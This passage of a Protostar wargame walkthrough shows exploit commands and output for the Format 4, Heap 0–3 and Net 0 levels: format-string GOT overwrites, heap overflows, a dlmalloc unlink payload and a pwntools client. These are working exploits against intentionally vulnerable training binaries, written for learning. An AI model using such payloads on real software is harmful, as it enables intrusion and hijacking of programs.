</span><span style="color:#d0dfe6;">DYNAMIC</span><span> SYMBOL TABLE:
</span><span style="color:#d0dfe6;">00000000</span><span>  w   D  </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000              __gmon_start__
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   fgets
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   __libc_start_main
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   _exit
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   printf
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   puts
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   exit
</span><span style="color:#d0dfe6;">080485ec</span><span> g    DO .rodata        00000004  Base        _IO_stdin_used
</span><span style="color:#d0dfe6;">08049730</span><span> g    DO .bss   00000004  GLIBC_2.0   stdin
</span><span>
</span><span>
</span><span style="color:#d0dfe6;">DYNAMIC</span><span> RELOCATION RECORDS
</span><span style="color:#d0dfe6;">OFFSET</span><span>   TYPE              VALUE
</span><span style="color:#d0dfe6;">080496fc</span><span> R_386_GLOB_DAT    __gmon_start__
</span><span style="color:#d0dfe6;">08049730</span><span> R_386_COPY        stdin
</span><span style="color:#d0dfe6;">0804970c</span><span> R_386_JUMP_SLOT   __gmon_start__
</span><span style="color:#d0dfe6;">08049710</span><span> R_386_JUMP_SLOT   fgets
</span><span style="color:#d0dfe6;">08049714</span><span> R_386_JUMP_SLOT   __libc_start_main
</span><span style="color:#d0dfe6;">08049718</span><span> R_386_JUMP_SLOT   _exit
</span><span style="color:#d0dfe6;">0804971c</span><span> R_386_JUMP_SLOT   printf
</span><span style="color:#d0dfe6;">08049720</span><span> R_386_JUMP_SLOT   puts
</span><span style="color:#d0dfe6;">08049724</span><span> R_386_JUMP_SLOT   exit
</span><span>
</span><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -t</span><span> format4 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> hello
</span><span style="color:#d0dfe6;">080484b4</span><span> g     F .text  0000001e              hello
</span><span style="color:#d0dfe6;">$</span><span> i=0</span><span style="color:#748aa6;">; while </span><span style="color:#267fb5;">[ </span><span>$</span><span style="color:#d0dfe6;">i </span><span style="font-style:italic;color:#95cc5e;">-le</span><span> 10 </span><span style="color:#267fb5;">]</span><span style="color:#748aa6;">; do </span><span style="color:#d0dfe6;">i</span><span style="color:#748aa6;">=</span><span style="color:#6ee2ff;">$((i</span><span style="color:#748aa6;">+</span><span style="color:#6ee2ff;">1))</span><span style="color:#748aa6;">; </span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;aaaa%%%03d</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">08x&#39; % $</span><span style="color:#d0dfe6;">i</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format4</span><span style="color:#748aa6;">; done
</span><span style="color:#d0dfe6;">aaaa00000200
</span><span style="color:#d0dfe6;">aaaab7fd8420
</span><span style="color:#d0dfe6;">aaaabffffb14
</span><span style="color:#d0dfe6;">aaaa61616161
</span><span style="color:#d0dfe6;">aaaa35303025
</span><span style="color:#d0dfe6;">aaaa78383024
</span><span style="color:#d0dfe6;">aaaa0000000a
</span><span style="color:#d0dfe6;">aaaab7fff524
</span><span style="color:#d0dfe6;">aaaabffffb70
</span><span style="color:#d0dfe6;">aaaab7fe35c9
</span><span style="color:#d0dfe6;">aaaa00000007
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) b </span><span style="color:#748aa6;">*</span><span>0x0804851a
</span><span style="color:#d0dfe6;">Breakpoint</span><span> 1 at 0x804851a: file format4/format4.c, line 27.
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) r
</span><span style="color:#d0dfe6;">Starting</span><span> program: /opt/protostar/bin/format4
</span><span>
</span><span style="color:#d0dfe6;">Breakpoint</span><span> 1, main (argc=1, argv=0xbffffd54) </span><span style="color:#d0dfe6;">at</span><span> format4/format4.c:27
</span><span style="color:#d0dfe6;">27</span><span>      format4/format4.c: No such file or directory.
</span><span>        </span><span style="color:#d0dfe6;">in</span><span> format4/format4.c
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) p exit
</span><span style="color:#d0dfe6;">$1</span><span> = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 </span><span style="color:#748aa6;">&lt;*</span><span>__GI_exit</span><span style="color:#748aa6;">&gt;
</span><span>(</span><span style="color:#d0dfe6;">gdb</span><span>) quit
</span><span>
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;\x24\x97\x04\x08&#39;+&#39;\x25\x97\x04\x08&#39;+&#39;\x26\x97\x04\x08&#39;+&#39;\x27\x97\x04\x08&#39;+&#39;%164x%4</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">n&#39;+&#39;%208x%5</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">n&#39;+&#39;%128x%6</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">n&#39;+&#39;%260x%7</span><span style="color:#4cbbff;">\$</span><span style="color:#6ee2ff;">n&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./format4
</span><span style="color:#d0dfe6;">$%</span><span style="color:#748aa6;">&amp;</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffffb14                                                                                                                                                                                                                                                             8049724
</span><span style="color:#6ee2ff;">code execution redirected! you win
</span><span style="color:#6ee2ff;">
</span><span style="color:#6ee2ff;">
</span></code></pre>
<h1 id="heap-0">Heap 0</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -t</span><span> heap0 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> winner
</span><span style="color:#d0dfe6;">08048464</span><span> g     F .text  00000014              winner
</span><span style="color:#d0dfe6;">08048478</span><span> g     F .text  00000014              nowinner
</span><span style="color:#d0dfe6;">$</span><span> ./heap0 `</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;a&#39;*72+&#39;\x64\x84\x04\x08&#39;</span><span style="color:#516a88;">&quot;</span><span>`
</span><span style="color:#d0dfe6;">data</span><span> is at 0x804a008, fp is at 0x804a050
</span><span style="color:#d0dfe6;">level</span><span> passed
</span></code></pre>
<h1 id="heap-1">Heap 1</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> ltrace ./heap1 1234 1234
</span><span style="color:#d0dfe6;">__libc_start_main</span><span>(0x80484b9, 3, 0xbffffd84, 0x8048580, 0x8048570 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">malloc</span><span>(8)                                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804a008
</span><span style="color:#d0dfe6;">malloc</span><span>(8)                                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804a018
</span><span style="color:#d0dfe6;">malloc</span><span>(8)                                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804a028
</span><span style="color:#d0dfe6;">malloc</span><span>(8)                                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804a038
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804a018, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">1234</span><span style="color:#516a88;">&quot;</span><span>)                            </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804a018
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804a038, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">1234</span><span style="color:#516a88;">&quot;</span><span>)                            </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804a038
</span><span style="color:#d0dfe6;">puts</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">and that&#39;s a wrap folks!</span><span style="color:#516a88;">&quot;</span><span>and that</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">s a wrap folks!
</span><span style="color:#6ee2ff;">)                      = 25
</span><span style="color:#6ee2ff;">+++ exited (status 25) +++
</span><span style="color:#6ee2ff;">$ objdump -t heap1 | grep winner
</span><span style="color:#6ee2ff;">08048494 g     F .text  00000025              winner
</span><span style="color:#6ee2ff;">$ objdump -TR heap1 | grep puts
</span><span style="color:#6ee2ff;">00000000      DF *UND*  00000000  GLIBC_2.0   puts
</span><span style="color:#6ee2ff;">08049774 R_386_JUMP_SLOT   puts
</span><span style="color:#6ee2ff;">$ ./heap1 `python -c &quot;print </span><span style="color:#516a88;">&#39;</span><span>a</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">*20+</span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\x</span><span>74</span><span style="color:#4cbbff;">\x</span><span>97</span><span style="color:#4cbbff;">\x</span><span>04</span><span style="color:#4cbbff;">\x</span><span>08</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">&quot;` `python -c &quot;print </span><span style="color:#516a88;">&#39;</span><span style="color:#4cbbff;">\x</span><span>94</span><span style="color:#4cbbff;">\x</span><span>84</span><span style="color:#4cbbff;">\x</span><span>04</span><span style="color:#4cbbff;">\x</span><span>08</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">&quot;`
</span><span style="color:#6ee2ff;">and we have a winner @ 1532607490
</span></code></pre>
<h1 id="heap-2">Heap 2</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> ./heap2
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> (nil)</span><span style="color:#d0dfe6;">,</span><span> service = (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#d0dfe6;">auth</span><span> wang
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#d0dfe6;">reset
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#d0dfe6;">serviceaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> 0x804c018 </span><span style="color:#267fb5;">]
</span><span style="color:#d0dfe6;">login
</span><span style="color:#d0dfe6;">you</span><span> have logged in already!
</span></code></pre>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;auth &#39;+&#39;a&#39;*30;print &#39;reset&#39;;print &#39;service&#39;+&#39;a&#39;*33;print &#39;login&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./heap2
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> (nil)</span><span style="color:#d0dfe6;">,</span><span> service = (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> 0x804c018 </span><span style="color:#267fb5;">]
</span><span style="color:#d0dfe6;">you</span><span> have logged in already!
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> 0x804c018 </span><span style="color:#267fb5;">]
</span><span style="color:#d0dfe6;">$</span><span> python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">print &#39;auth &#39;;print &#39;service&#39;+&#39;a&#39;*17;print &#39;login&#39;</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">./heap2
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> (nil)</span><span style="color:#d0dfe6;">,</span><span> service = (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> (nil) </span><span style="color:#d0dfe6;">]
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> 0x804c018 </span><span style="color:#267fb5;">]
</span><span style="color:#d0dfe6;">you</span><span> have logged in already!
</span><span style="color:#267fb5;">[</span><span> auth </span><span style="color:#748aa6;">=</span><span> 0x804c008, service </span><span style="color:#748aa6;">=</span><span> 0x804c018 </span><span style="color:#267fb5;">]
</span></code></pre>
<h1 id="heap-3">Heap 3</h1>
<pre data-lang="bash" style="background-color:#14191f;color:#aec2e0;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#d0dfe6;">$</span><span> ltrace ./heap3 aaaa aaaa aaaa
</span><span style="color:#d0dfe6;">__libc_start_main</span><span>(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">sysconf</span><span>(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">4096
</span><span style="color:#d0dfe6;">sbrk</span><span>(4096)                                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c000
</span><span style="color:#d0dfe6;">sbrk</span><span>(0)                                                </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804d000
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804c008, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">aaaa</span><span style="color:#516a88;">&quot;</span><span>)                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c008
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804c030, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">aaaa</span><span style="color:#516a88;">&quot;</span><span>)                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c030
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804c058, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">aaaa</span><span style="color:#516a88;">&quot;</span><span>)                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c058
</span><span style="color:#d0dfe6;">puts</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">dynamite failed?</span><span style="color:#516a88;">&quot;</span><span>dynamite failed</span><span style="color:#748aa6;">?
</span><span>)           
</span><span style="color:#d0dfe6;">$</span><span> ltrace</span><span style="font-style:italic;color:#95cc5e;"> -S</span><span> ./heap3 aaaa aaaa aaaa
</span><span style="color:#d0dfe6;">SYS_brk</span><span>(NULL)                                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c000
</span><span style="color:#d0dfe6;">SYS_fcntl64</span><span>(0, 1, 0, 0, 0xb7ffeff4)                    </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_fcntl64</span><span>(1, 1, 0, 1, 0xb7ffeff4)                    </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_fcntl64</span><span>(2, 1, 0, 2, 0xb7ffeff4)                    </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/suid-debug</span><span style="color:#516a88;">&quot;</span><span>, 00)                      </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.nohwcap</span><span style="color:#516a88;">&quot;</span><span>, 00)                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 8192, 3, 34,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fe0000
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.preload</span><span style="color:#516a88;">&quot;</span><span>, 04)                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_open</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.cache</span><span style="color:#516a88;">&quot;</span><span>, 0, 00)                    </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">3
</span><span style="color:#d0dfe6;">SYS_fstat64</span><span>(3, 0xbffff6b4, 0xb7ffeff4, 0xb7fff87c, 3)  </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 13796, 1, 2, 3)                           </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fdc000
</span><span style="color:#d0dfe6;">SYS_close</span><span>(3)                                           </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_access</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/etc/ld.so.nohwcap</span><span style="color:#516a88;">&quot;</span><span>, 00)                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">-2
</span><span style="color:#d0dfe6;">SYS_open</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">/lib/libc.so.6</span><span style="color:#516a88;">&quot;</span><span>, 0, 00)                      </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">3
</span><span style="color:#d0dfe6;">SYS_read</span><span>(3, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">\177ELF\001\001\001</span><span style="color:#516a88;">&quot;</span><span>, 512)                </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">512
</span><span style="color:#d0dfe6;">SYS_fstat64</span><span>(3, 0xbffff700, 0xb7ffeff4, 0xb7fdf21d, 0x804849c) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 0x144948, 5, 2050, 3)                     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7e97000
</span><span style="color:#d0dfe6;">SYS_mprotect</span><span>(0xb7fd5000, 4096, 0)                      </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0xb7fd6000, 12288, 3, 2066, 3)               </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fd6000
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0xb7fd9000, 10568, 3, 50,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fd9000
</span><span style="color:#d0dfe6;">SYS_close</span><span>(3)                                           </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 4096, 3, 34,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7e96000
</span><span style="color:#d0dfe6;">SYS_set_thread_area</span><span>(0xbffffba0, 0xb7ffeff4, 0xb7e966c0, 1, 0) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mprotect</span><span>(0xb7fd6000, 8192, 1)                      </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mprotect</span><span>(0xb7ffe000, 4096, 1)                      </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_munmap</span><span>(0xb7fdc000, 13796)                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">__libc_start_main</span><span>(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">sysconf</span><span>(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">4096
</span><span style="color:#d0dfe6;">sbrk</span><span>(4096 </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">SYS_brk</span><span>(NULL)                                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c000
</span><span style="color:#d0dfe6;">SYS_brk</span><span>(0x0804d000)                                    </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804d000
</span><span style="color:#748aa6;">&lt;</span><span>... </span><span style="color:#d0dfe6;">sbrk</span><span> resumed</span><span style="color:#748aa6;">&gt; </span><span>)                                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c000
</span><span style="color:#d0dfe6;">sbrk</span><span>(0)                                                </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804d000
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804c008, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">aaaa</span><span style="color:#516a88;">&quot;</span><span>)                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c008
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804c030, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">aaaa</span><span style="color:#516a88;">&quot;</span><span>)                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c030
</span><span style="color:#d0dfe6;">strcpy</span><span>(0x0804c058, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">aaaa</span><span style="color:#516a88;">&quot;</span><span>)                             </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0x0804c058
</span><span style="color:#d0dfe6;">puts</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">dynamite failed?</span><span style="color:#516a88;">&quot; </span><span style="color:#748aa6;">&lt;</span><span>unfinished ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">SYS_fstat64</span><span>(1, 0xbffffb98, 0xb7fd7ff4, 0xb7fd84c0, 0x804ac27) </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0
</span><span style="color:#d0dfe6;">SYS_mmap2</span><span>(0, 4096, 3, 34,</span><span style="font-style:italic;color:#95cc5e;"> -1</span><span>)                          </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">0xb7fdf000
</span><span style="color:#d0dfe6;">SYS_write</span><span>(1, </span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">dynamite failed?\n</span><span style="color:#516a88;">&quot;</span><span>, 17dynamite failed</span><span style="color:#748aa6;">?
</span><span>)                 </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">17
</span><span style="color:#748aa6;">&lt;</span><span>... </span><span style="color:#d0dfe6;">puts</span><span> resumed</span><span style="color:#748aa6;">&gt; </span><span>)                                   </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">17
</span><span style="color:#d0dfe6;">SYS_exit_group</span><span>(17 </span><span style="color:#748aa6;">&lt;</span><span>no return ...</span><span style="color:#748aa6;">&gt;
</span><span style="color:#d0dfe6;">+++</span><span> exited (status 17) </span><span style="color:#d0dfe6;">+++
</span><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -tTR</span><span> heap3 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> winner
</span><span style="color:#d0dfe6;">08048864</span><span> g     F .text  00000025              winner
</span><span style="color:#d0dfe6;">$</span><span> objdump</span><span style="font-style:italic;color:#95cc5e;"> -tTR</span><span> heap3 </span><span style="color:#748aa6;">| </span><span style="color:#d0dfe6;">grep</span><span> puts
</span><span style="color:#d0dfe6;">00000000</span><span>       F </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000              puts@@GLIBC_2.0
</span><span style="color:#d0dfe6;">00000000</span><span>      DF </span><span style="color:#748aa6;">*</span><span>UND</span><span style="color:#748aa6;">*</span><span>  00000000  GLIBC_2.0   puts
</span><span style="color:#d0dfe6;">0804b128</span><span> R_386_JUMP_SLOT   puts
</span><span style="color:#d0dfe6;">$</span><span> ./heap3 `</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">print &quot;\x90&quot;*14 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*12 + &quot;\xf8\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;</span><span style="color:#516a88;">&#39;</span><span>` `</span><span style="color:#d0dfe6;">python</span><span style="font-style:italic;color:#95cc5e;"> -c </span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">print &quot;\xde\xad\xbe\xef&quot;*2+&quot;\x1c\xb1\x04\x08&quot;+&quot;\x08\xc0\x04\x08&quot;</span><span style="color:#516a88;">&#39;</span><span>` C
</span><span style="color:#d0dfe6;">that</span><span> wasn</span><span style="color:#516a88;">&#39;</span><span style="color:#6ee2ff;">t too bad now, was it? @ 1532745821
</span></code></pre>
<h2 id="xue-xi-zi-liao">学习资料</h2>
<p><a rel="noopener nofollow noreferrer" target="_blank" href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/">图解DWORDSHOOT</a></p>
<p><a rel="noopener nofollow noreferrer" target="_blank" href="http://turingh.github.io/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></p>
<h1 id="net-0">Net 0</h1>
<pre data-lang="python" style="background-color:#14191f;color:#aec2e0;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#748aa6;">from </span><span>pwn </span><span style="color:#748aa6;">import </span><span style="color:#6ee2ff;">*
</span><span>
</span><span>r </span><span style="color:#748aa6;">= </span><span style="color:#d0dfe6;">remote</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#6ee2ff;">192.168.116.137</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#6ee2ff;">2999</span><span>)
</span><span>s </span><span style="color:#748aa6;">= </span><span>r.</span><span style="color:#d0dfe6;">recv</span><span>()
</span><span>pos </span><span style="color:#748aa6;">= </span><span>s.</span><span style="color:#d0dfe6;">find</span><span>(</span><span style="color:#516a88;">&quot;</span><span style="color:#4cbbff;">\&#39;</span><span style="color:#516a88;">&quot;</span><span>, </span><span style="color:#6ee2ff;">13</span><span>)
</span><span>num </span><span style="color:#748aa6;">= </span><span style="font-style:italic;color:#267fb5;">int</span><span>(s[</span><span style="color:#6ee2ff;">13</span><span>:pos])
</span><span>r.</span><span style="color:#d0dfe6;">sendline</span><span>(</span><span style="color:#d0dfe6;">p32</span><span>(num))
